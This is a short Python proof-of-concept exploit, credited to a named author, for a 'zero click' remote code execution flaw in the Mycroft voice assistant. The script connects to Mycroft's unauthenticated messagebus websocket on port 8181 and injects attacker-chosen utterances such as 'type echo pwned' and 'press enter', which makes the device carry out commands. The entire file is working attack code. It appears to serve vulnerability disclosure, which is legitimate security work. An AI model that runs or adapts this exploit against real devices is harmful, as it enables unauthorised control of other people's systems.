#!/usr/bin/env python
# Mycroft "Zero Click" Remote Code Execution
# Author: Francesco Giordano
# CVE-2018-xxxxx
# PoC.py "type echo pwned" "press enter"

import sys
import asyncio
import websockets
import time

cmds = sys.argv[1:]
uri = "ws://myserver:8181/core"


async def sendPayload():
    for payload in cmds:
        async with websockets.connect(uri) as websocket:
            await websocket.send("{\"data\": {\"utterances\": [\""+payload+"\"]}, \"type\": \"recognizer_loop:utterance\", \"context\": null}")
            time.sleep(1)

asyncio.get_event_loop().run_until_complete(sendPayload())

